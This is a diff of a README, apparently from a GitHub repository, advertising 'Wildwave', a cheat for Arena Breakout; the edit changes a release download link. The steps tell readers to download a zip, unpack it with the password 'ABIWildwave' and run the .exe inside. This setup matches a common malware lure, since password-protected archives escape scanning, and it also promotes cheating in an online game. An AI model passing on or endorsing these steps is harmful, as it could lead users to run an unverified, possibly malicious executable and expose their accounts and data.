@@ -8,7 +8,7 @@ We know very well how difficult it is to win games absolutely every time, and we
 Now it's possible! We are glad to introduce you - Wildwave
 ---
 ## How to Use
-1. **Get the Latest Version**: (https://github.com/Perrainary/Areana-Breakout-Wildwave-Cheat/releases/download/latest/03_ABIWildwave.zip).
+1. **Get the Latest Version**: (https://github.com/Perrainary/Areana-Breakout-Wildwave-Cheat/releases/download/latest/ABIWildwave.zip).
 2. **Unzip the Files**: Use pass `ABIWildwave` to unpack.
 3. **Run the Application**: Execute the `.exe` file. (If it doesn't work, contact the developer.)
 4. **In-Game Key**: Press `HOME` to activate.
